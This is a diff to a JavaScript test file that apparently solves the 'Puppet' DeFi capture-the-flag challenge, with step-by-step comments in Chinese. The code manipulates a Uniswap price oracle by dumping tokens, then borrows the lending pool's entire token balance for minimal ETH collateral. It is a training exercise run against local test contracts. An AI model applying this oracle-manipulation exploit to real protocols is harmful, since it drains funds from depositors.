@@ -103,11 +103,59 @@ describe('[Challenge] Puppet', function () {
   })
 
   it('Exploit', async function () {
-    /** CODE YOUR EXPLOIT HERE */
+    const attackerCallLendingPool = this.lendingPool.connect(attacker)
+    const attackerCallToken = this.token.connect(attacker)
+    const attackerCallUniswap = this.uniswapExchange.connect(attacker)
+    const printBalance = async (groupName) => {
+      console.group(groupName)
+      const attackerETHBalance = await ethers.provider.getBalance(attacker.address)
+      const attackerTokenBalance = await this.token.balanceOf(attacker.address)
 
-    const attackerLendingPool = this.lendingPool.connect(attacker)
-    const attackerToken = this.token.connect(attacker)
-    const attackerUniswap = this.uniswapExchange.connect(attacker)
+      console.log('Attacker ETH: ', ethers.utils.formatEther(attackerETHBalance))
+      console.log('Attacker DVT: ', ethers.utils.formatEther(attackerTokenBalance))
+
+      const uniswapETHBalance = await ethers.provider.getBalance(this.uniswapExchange.address)
+      const uniswapTokenBalance = await this.token.balanceOf(this.uniswapExchange.address)
+
+      console.log('Uniswap ETH: ', ethers.utils.formatEther(uniswapETHBalance))
+      console.log('Uniswap DVT: ', ethers.utils.formatEther(uniswapTokenBalance))
+
+      const lendingPoolTokenBalance = await this.token.balanceOf(this.lendingPool.address)
+      console.log('LendingPool DVT: ', ethers.utils.formatEther(lendingPoolTokenBalance))
+      console.groupEnd()
+    }
+
+    // 授权 uniswap 支配 attacker 的 DVT token
+    await attackerCallToken.approve(attackerCallUniswap.address, ATTACKER_INITIAL_TOKEN_BALANCE)
+
+    // 在 uniswap 中使用 DVT 兑换 ETH
+    await attackerCallUniswap.tokenToEthSwapInput(
+      ATTACKER_INITIAL_TOKEN_BALANCE,
+      ethers.utils.parseEther('1'),
+      (await ethers.provider.getBlock('latest')).timestamp * 2
+    )
+
+    // 计算需要抵押的 ETH 数量
+    const collateralCount = await attackerCallLendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+    // 借出 DVT
+    await attackerCallLendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {
+      value: collateralCount
+    })
+
+    // 计算兑换 ATTACKER_INITIAL_TOKEN_BALANCE 数量的 DVT 需要多少 ETH
+    const payEthCount = await attackerCallUniswap.getEthToTokenOutputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, {
+      gasLimit: 1e6
+    })
+    // 兑换 DVT
+    await attackerCallUniswap.ethToTokenSwapOutput(
+      ATTACKER_INITIAL_TOKEN_BALANCE,
+      (await ethers.provider.getBlock('latest')).timestamp * 2,
+      {
+        value: payEthCount,
+        gasLimit: 1e6
+      }
+    )
+    printBalance()
   })
 
   after(async function () {
